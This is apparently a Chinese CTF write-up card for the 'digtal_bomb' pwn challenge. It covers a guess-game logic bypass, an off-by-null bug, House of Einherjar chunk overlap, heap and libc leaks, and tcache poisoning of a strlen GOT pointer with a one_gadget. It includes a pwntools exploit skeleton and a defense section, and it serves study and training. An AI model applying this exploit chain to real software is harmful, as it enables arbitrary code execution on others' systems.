---
id: binary-pwn-heap-digtal-bomb-offby-null-einherjar-tcache-strlen-got-onegadget
title: 湾区杯2025 digtal_bomb：猜数范围逻辑绕过进入堆菜单，off-by-null + House of Einherjar 造重叠泄露 libc，tcache 投毒 strlen GOT 打 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: digtal-bomb-guess-range-bypass-offby-null-einherjar-tcache-got-onegadget
aliases:
- digtal_bomb
- 湾区杯2025
- 炸弹猜数绕过
- 猜数范围逻辑漏洞
- off-by-null 进堆菜单
- House of Einherjar 重叠
- strlen GOT one_gadget
tags:
- pwn
- heap
- glibc
- off-by-null
- house-of-einherjar
- tcache
- safe-linking
- got-hijack
- one-gadget
- largebin
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V232
  verified_at: '2026-11-07T09:24:42+08:00'
  notes: 已对照原文与12张图核对：min=499/max=500 时 rand()%1=0 种子恒为499，猜500使上界=499，满足 seed==min==max 进入 heapFunc；add 的 read 后 chunk[v4]=0 形成 off-by-null；delete 清指针无 UAF、edit_one 仅一次 0x10 写；EXP 的 largebin fd_nextsize 泄 heap、重叠块泄 libc(0x21ace0)、tcache 投毒 libc+0x21A090(脚本命名 strlen_got) 写 0xebc85 均照原文脚本记录。未验证点：libc 偏移、one_gadget 与 0x21A090 是否实为 strlen GOT 未在题目环境复核，原文脚本自身命名如此，卡内已标 confidence=medium；未运行 EXP。
---

## 一句话结论

猜数游戏只校验 `num_min < num_max`，而炸弹数按 `rand() % (max-min) + min` 生成；令 `min=499,max=500` 时种子恒为 `499`，再猜 `500` 就会把上界收窄到 `499`，在从未猜中种子的情况下满足 `seed == min == max` 并进入堆菜单。堆菜单的 `add` 在 `read` 后无条件写 NUL 形成 off-by-null，配合 House of Einherjar 生成重叠块，先泄露 heap、再泄露 libc，最后 tcache 投毒把分配引到 `strlen` 相关指针并写 one_gadget 拿 shell。

## 原理

- **猜数逻辑绕过**：`main` 只拒绝 `num_min < 0`、`num_max > 500`、`num_min >= num_max`，随后 `num_seed = rand() % (num_max - num_min) + num_min`，所以种子总是落在 `[min, max-1]`。每次猜错时 `update_boundary` 按“猜的数大于等于种子就把上界设为猜测值减一，否则下界设为猜测值加一”收紧区间；当区间只剩种子时 `num_seed == num_min && num_seed == num_max` 成立，程序认为炸弹已拆除并调用 `heapFunc`。因此只要先让区间宽度为 1（`max = min + 1`），种子必为 `min`，再猜 `max` 就会把上界改写成 `min`，无需猜中种子即可进入堆菜单。
- **off-by-null 的来源**：`add` 允许申请 `0x10 < size <= 0x800` 的 chunk，`v4 = read(0, chunk, size)` 之后执行 `chunk[v4] = 0`。若一次写满 `size` 字节（`v4 == size`），这个 NUL 就落在下一 chunk 的 `size` 最低字节；对 size 低字节为 `0x00` 的 chunk 而言，相当于只清掉 `PREV_INUSE`，不改变 size。
- **两次泄露**：先用一个 0x490 的大 chunk 在 unsorted/largebin 中留下 bin 指针。`edit_one` 只写前 0x10 字节，覆盖 `fd/bk` 但留下用户区 `+0x10` 的 largebin `fd_nextsize` 自指指针，`show` 用 `puts` 输出即可泄露 heap 地址；House of Einherjar 合并后，重叠块里的 unsorted bin `fd` 又能被 `show` 读出，减去 `main_arena` 偏移得到 libc 基址（原文脚本用 `0x21ace0`）。
- **House of Einherjar 造重叠**：在 heap 泄露得到的地址附近布置 fake chunk（`prev_size=0`、`size=0x90`、`fd=bk=自身用户地址`），把后一个 chunk 的 `prev_size` 改成与 fake size 相同的值，并在 `add` 时用 off-by-null 清掉它的 `PREV_INUSE`；填满 0xf8 档 tcache 后释放该 chunk，`free` 回退到 fake chunk 并完成向前合并，合并块覆盖了原本独立的 chunk，形成重叠。
- **tcache 投毒到控制流**：重叠块允许改写已经释放、仍挂在 tcache 里的某个 chunk 的 `fd`；按 safe-linking 编码成 `target ^ (pos >> 12)`，之后连续 `malloc` 就能在目标地址拿到一块可写内存。原文脚本把目标设为 `libc_base + 0x21A090`（脚本中命名 `strlen_got`），再写入 one_gadget（原文候选偏移包括 `0xebc81/0xebc85/0xebc88/0xebce2/0xebd38/0xebd3f`，实际使用第 2 个 `0xebc85`），从而在后续调用中触发 `execve("/bin/sh", ...)`。
- **为什么需要先填满 tcache**：若目标大小对应的 tcache 未满，`free` 会把 chunk 直接放入 tcache，不会进入 unsorted bin 的向前合并分支；原文先申请 7 个 0xf8 chunk 并释放，填满 tcache 后才释放被 off-by-null 标记的 chunk。

## 触发条件

- 目标为菜单式堆题，存在“先猜数/小游戏，通关后才进入堆功能”的入口；游戏的范围校验允许 `max - min == 1`，且胜利条件可以在不猜中种子的情况下被边界更新满足。
- `add` 在 `read` 返回后无条件执行 `buf[n] = 0`，且允许一次写满请求长度（off-by-null）。
- 程序提供 `show`/输出接口用于泄露，且至少有一次不受长度限制的编辑或重叠写；`delete` 清空指针，不能直接 UAF。
- 目标 glibc 启用 tcache 与 safe-linking（原文 One-gadget/libc 偏移对应其题目 libc，需按实际 libc 重新核对）；需要 heap 地址泄露来计算 safe-linking 编码和 fake chunk 地址。
- 目标二进制可写 GOT（非 Full RELRO）或存在其他可写函数指针；one_gadget 的寄存器/栈约束需满足。

## 利用步骤

1. **绕过猜数**：输入 `min=499, max=500`（`rand() % 1 == 0`，种子恒为 499），再猜 `500`；`update_boundary` 将上界改为 499，触发 `num_seed == min == max`，进入 `heapFunc`。
2. **泄露 heap**：`add(0,0x490)`、`add(1,0xf8)`、`free(0)`，再 `add(2,0x4f0)`、`add(0,0x490)` 复用大块；用一次 `edit(0, 'a'*0x10)` 覆盖 bin 的 `fd/bk`，`show(0)` 读出 `fd_nextsize` 自指指针得到 heap 地址。
3. **布置 Einherjar**：重新释放相关 chunk，申请 0x38 chunk 作为 fake chunk 容器，写入 `prev_size=0, size=0x90, fd=bk=heap+0x10`；再申请 0x28 的溢出源与 0xf8 的受害者，在溢出源末尾写入受害者的 `prev_size`，并通过 `add` 的 NUL 清掉受害者的 `PREV_INUSE`。
4. **填满 tcache 并合并**：申请 7 个 0xf8 chunk 后全部释放，填满 0xf8 tcache；释放受害者，触发 House of Einherjar 向前合并，得到覆盖多个 chunk 的空闲块。
5. **泄露 libc**：从合并块中重新申请，利用重叠块 `show` 出 unsorted bin 的 `fd`，按目标 libc 的 `main_arena` 偏移计算 libc 基址（原文脚本用 `libc_base = leak - 0x21ace0`）。
6. **tcache 投毒**：继续用重叠块改写已释放 chunk 的 `fd`，目标设为 `libc_base + 0x21A090`（脚本命名 `strlen_got`），按 `target ^ (pos >> 12)` 编码；两次分配后让 `malloc` 返回目标附近。
7. **写 one_gadget**：向目标写入 one_gadget（原文用 `0xebc85`），随后触发对应 libc 调用，`execve("/bin/sh", ...)` 拿 shell。

## PoC

原文给出完整 pwntools 脚本；下面只保留关键步骤骨架，libc 偏移、chunk 尺寸和 one_gadget 必须按目标环境重新核对：

```python
from pwn import *

# 1) 猜数绕过：宽度为 1 时种子必为 499，猜 500 使上界变 499
io.sendlineafter(b'Enter min (0-500): ', b'499')
io.sendlineafter(b'Enter max (0-500): ', b'500')
io.sendlineafter(b'Your guess :', b'500')

# 2) heap 泄露：大 chunk 的 bin 指针 + edit 覆盖前 0x10 + show 读 fd_nextsize
add(0, 0x490, b'a'); add(1, 0xf8, b'b'); free(0)
add(2, 0x4f0, b'c'); add(0, 0x490, b'd')
edit(0, b'a' * 0x10)
show(0)
io.recvuntil(b'a' * 0x10)
heap = u64(io.recv(6).ljust(8, b'\x00'))

# 3) fake chunk + off-by-null 触发 Einherjar（尺寸按题目布局）
add(0, 0x38, p64(0) + p64(0x90) + p64(heap + 0x10) * 2)
add(1, 0x28, b'g'); add(2, 0x28, b'h'); add(3, 0xf8, p64(0) * 2)
# 在 chunk2 用户区写 chunk3 的 prev_size，add 写满后 NUL 清 chunk3 的 PREV_INUSE
...
for i in range(4, 11): add(i, 0xf8, b'x')  # 填满 0xf8 tcache
for i in range(4, 11): free(i)
free(3)                                     # 向前合并到 fake chunk

# 4) 重叠块泄露 libc
add(3, 0x28, b'a'); show(1)
libc = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21ace0

# 5) tcache 投毒到 strlen GOT，写 one_gadget
strlen_got = libc + 0x21A090
fake_fd = strlen_got ^ (heap >> 12)
payload = p64(0) * 5 + p64(0x31) + p64(fake_fd)[:-2]
add(4, 0x158, payload)
payload = p64(strlen_got) + p64(libc + 0xebc85)[:-2]
add(5, 0x28, payload)
io.interactive()
```

以上为原文脚本的压缩示意：原文还包含分配填充块、`free(5)/free(2)/free(4)` 等调整 tcache 链的操作，且脚本里的 `pause()`/调试辅助需删除。所有偏移和尺寸以目标二进制与 libc 为准。

## 变体与关联

- **只改入口、不改堆链**：若目标没有猜数小游戏，可把本卡的 heap 部分当作“off-by-null + House of Einherjar + tcache 投毒打 GOT”的独立模板；反之，若只有游戏逻辑而无堆漏洞，则不构成本卡场景。
- **收尾目标变体**：可把 `strlen` 相关指针换成 `free@got`、`printf@got`、`__malloc_hook`/`__free_hook`（依 glibc 版本）或栈上返回地址；也可用 FSOP 替代 GOT 劫持。
- **泄露变体**：若题目没有 largebin 自指指针，可用 unsorted bin、tcache 链表或 stdout 部分覆写泄露 heap；若开启 full RELRO，需要改走 `__exit_funcs`/FSOP 等非 GOT 路径。
- 关联：[[binary-pwn-heap-house-of-einherjar-offby-null-fake-chunk-tcache-poison]]（本卡使用的 House of Einherjar + tcache 投毒通用原理与最小 C PoC）、[[binary-pwn-heap-vfs-offby-null-einherjar-largebin-io-list-all-fsop]]（Einherjar 后接 largebin/FSOP 的另一条链）、[[binary-pwn-heap-xor-chunklist-lucky-number-arbitrary-free-uaf]]（同为 CTF 堆题中先绕过前置逻辑再打 one_gadget）。

## 检测与防御

- **入口逻辑**：范围生成要保证 `max - min` 足够大，且胜利条件不能通过“把边界收紧到种子”这种非猜测操作满足；对 `rand() % (max-min)` 的除零/单元素区间做显式拒绝，不要用可预测的 `rand()` 做安全判定。
- **off-by-null**：`read` 后只在 `n < size` 时补 NUL，或预留 1 字节/使用显式长度；对 `add`、`edit` 的写入长度统一做上界检查。
- **堆与 GOT**：开启 Full RELRO 使 GOT 只读；启用 tcache safe-linking、tcache key、堆一致性检查；对函数指针/one_gadget 目标做 CFI 或指针完整性保护。
- **检测**：关注 `corrupted size vs. prev_size while consolidating`、`corrupted double-linked list`、`unaligned tcache chunk detected` 等 glibc 报错；GOT 中出现指向 libc 的可执行地址、`strlen`/`free` 等函数指针被改写、同一 chunk 同时出现在 tcache 与 unsorted bin，都是可疑信号。
